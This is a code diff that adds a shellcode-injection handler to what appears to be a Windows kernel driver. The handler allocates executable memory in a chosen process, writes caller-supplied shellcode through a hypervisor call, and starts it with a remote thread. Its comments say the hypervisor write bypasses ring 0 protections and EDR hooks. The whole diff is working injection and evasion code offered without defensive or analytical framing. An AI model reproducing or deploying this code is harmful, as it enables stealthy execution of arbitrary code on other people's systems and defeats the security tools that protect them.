@@ -151,6 +151,11 @@ NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 		status = HandleHvListHiddenDrivers(Irp, irpSp, &info);
 		break;
 
+	// Ring -1 Injection IOCTLs
+	case IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE:
+		status = HandleHvInjectShellcode(Irp, irpSp, &info);
+		break;
+
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		break;
@@ -1722,5 +1727,241 @@ NTSTATUS HandleHvListHiddenDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PT
 
 	*info = sizeof(HiddenDriverListResponse);
 
+	return status;
+}
+
+// ============== Ring -1 Injection Handlers ==============
+
+NTSTATUS HandleHvInjectShellcode(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
+{
+	KdPrint((DRIVER_PREFIX "Ring -1 shellcode injection request\n"));
+
+	// Validate hypervisor is running
+	if (!HvIsHypervisorRunning())
+	{
+		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 injection\n"));
+		return STATUS_HV_NOT_PRESENT;
+	}
+
+	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
+
+	if (inputLen < sizeof(HvInjectShellcodeRequest))
+	{
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+
+	if (outputLen < sizeof(HvInjectShellcodeResponse))
+	{
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+
+	auto request = (HvInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
+	auto response = (HvInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;
+
+	if (!request || request->ShellcodeSize == 0)
+	{
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	// Validate buffer size
+	SIZE_T expectedSize = FIELD_OFFSET(HvInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
+	if (inputLen < expectedSize)
+	{
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+
+	KdPrint((DRIVER_PREFIX "Ring -1 injecting %u bytes into PID %u\n",
+		request->ShellcodeSize, request->TargetProcessId));
+
+	NTSTATUS status = STATUS_SUCCESS;
+	PVOID allocatedAddress = nullptr;
+
+	// Step 1: Open target process and allocate memory
+	PEPROCESS targetProcess = nullptr;
+	status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->TargetProcessId, &targetProcess);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
+		return status;
+	}
+
+	// Attach to target process to allocate memory
+	KAPC_STATE apcState;
+	KeStackAttachProcess(targetProcess, &apcState);
+
+	SIZE_T regionSize = request->ShellcodeSize;
+	status = ZwAllocateVirtualMemory(
+		ZwCurrentProcess(),
+		&allocatedAddress,
+		0,
+		&regionSize,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE
+	);
+
+	if (!NT_SUCCESS(status))
+	{
+		KeUnstackDetachProcess(&apcState);
+		ObDereferenceObject(targetProcess);
+		KdPrint((DRIVER_PREFIX "Failed to allocate memory: 0x%X\n", status));
+		return status;
+	}
+
+	KdPrint((DRIVER_PREFIX "Allocated memory at 0x%p in target process\n", allocatedAddress));
+
+	// Touch the memory to page it in - hypervisor needs physical backing
+	// This forces the OS to allocate physical pages for the committed memory
+	__try
+	{
+		RtlZeroMemory(allocatedAddress, request->ShellcodeSize);
+		KdPrint((DRIVER_PREFIX "Memory paged in successfully\n"));
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint((DRIVER_PREFIX "Failed to touch memory: exception\n"));
+		SIZE_T freeSize = 0;
+		ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
+		KeUnstackDetachProcess(&apcState);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ACCESS_VIOLATION;
+	}
+
+	KeUnstackDetachProcess(&apcState);
+
+	// Step 2: Use hypervisor to write shellcode (ring -1 write)
+	// This bypasses all ring 0 protections (copy-on-write, EDR hooks, etc.)
+	__try
+	{
+		ULONG64 bytesWritten = HvInjectShellcode(
+			request->TargetProcessId,
+			allocatedAddress,
+			(PVOID)request->Shellcode,
+			request->ShellcodeSize
+		);
+
+		KdPrint((DRIVER_PREFIX "Ring -1 write completed: %llu bytes written\n", bytesWritten));
+
+		if (bytesWritten == 0)
+		{
+			// Fallback: ring -1 write failed (target memory not paged in, etc.)
+			// Free the allocated memory
+			KeStackAttachProcess(targetProcess, &apcState);
+			SIZE_T freeSize = 0;
+			ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
+			KeUnstackDetachProcess(&apcState);
+
+			ObDereferenceObject(targetProcess);
+
+			response->Success = FALSE;
+			response->AllocatedAddress = 0;
+			response->BytesWritten = 0;
+			*info = sizeof(HvInjectShellcodeResponse);
+			return STATUS_UNSUCCESSFUL;
+		}
+
+		// Step 3: Create a remote thread to execute shellcode
+		// We still need to use ring 0 for thread creation (no hypercall for this yet)
+
+		// Resolve RtlCreateUserThread
+		UNICODE_STRING funcName;
+		RtlInitUnicodeString(&funcName, L"RtlCreateUserThread");
+
+		typedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(
+			HANDLE ProcessHandle,
+			PSECURITY_DESCRIPTOR SecurityDescriptor,
+			BOOLEAN CreateSuspended,
+			ULONG StackZeroBits,
+			PULONG StackReserved,
+			PULONG StackCommit,
+			PVOID StartAddress,
+			PVOID StartParameter,
+			PHANDLE ThreadHandle,
+			PVOID ClientId
+			);
+
+		RtlCreateUserThread_t pfnRtlCreateUserThread =
+			(RtlCreateUserThread_t)MmGetSystemRoutineAddress(&funcName);
+
+		if (!pfnRtlCreateUserThread)
+		{
+			KdPrint((DRIVER_PREFIX "Failed to resolve RtlCreateUserThread\n"));
+			ObDereferenceObject(targetProcess);
+			response->Success = FALSE;
+			response->AllocatedAddress = (ULONG64)allocatedAddress;
+			response->BytesWritten = bytesWritten;
+			*info = sizeof(HvInjectShellcodeResponse);
+			return STATUS_NOT_FOUND;
+		}
+
+		// Get a handle to the target process
+		HANDLE processHandle = nullptr;
+		status = ObOpenObjectByPointer(
+			targetProcess,
+			OBJ_KERNEL_HANDLE,
+			nullptr,
+			PROCESS_ALL_ACCESS,
+			*PsProcessType,
+			KernelMode,
+			&processHandle
+		);
+
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "Failed to get process handle: 0x%X\n", status));
+			ObDereferenceObject(targetProcess);
+			response->Success = FALSE;
+			response->AllocatedAddress = (ULONG64)allocatedAddress;
+			response->BytesWritten = bytesWritten;
+			*info = sizeof(HvInjectShellcodeResponse);
+			return status;
+		}
+
+		// Create the thread
+		HANDLE threadHandle = nullptr;
+		status = pfnRtlCreateUserThread(
+			processHandle,
+			nullptr,
+			FALSE,    // Not suspended
+			0,
+			nullptr,
+			nullptr,
+			allocatedAddress,  // Start address = shellcode
+			nullptr,           // No parameter
+			&threadHandle,
+			nullptr
+		);
+
+		ZwClose(processHandle);
+
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "Failed to create remote thread: 0x%X\n", status));
+			ObDereferenceObject(targetProcess);
+			response->Success = FALSE;
+			response->AllocatedAddress = (ULONG64)allocatedAddress;
+			response->BytesWritten = bytesWritten;
+			*info = sizeof(HvInjectShellcodeResponse);
+			return status;
+		}
+
+		ZwClose(threadHandle);
+		KdPrint((DRIVER_PREFIX "Ring -1 injection successful!\n"));
+
+		response->Success = TRUE;
+		response->AllocatedAddress = (ULONG64)allocatedAddress;
+		response->BytesWritten = bytesWritten;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint((DRIVER_PREFIX "Exception during ring -1 injection\n"));
+		status = STATUS_UNSUCCESSFUL;
+		response->Success = FALSE;
+		response->AllocatedAddress = 0;
+		response->BytesWritten = 0;
+	}
+
+	ObDereferenceObject(targetProcess);
+	*info = sizeof(HvInjectShellcodeResponse);
 	return status;
 }
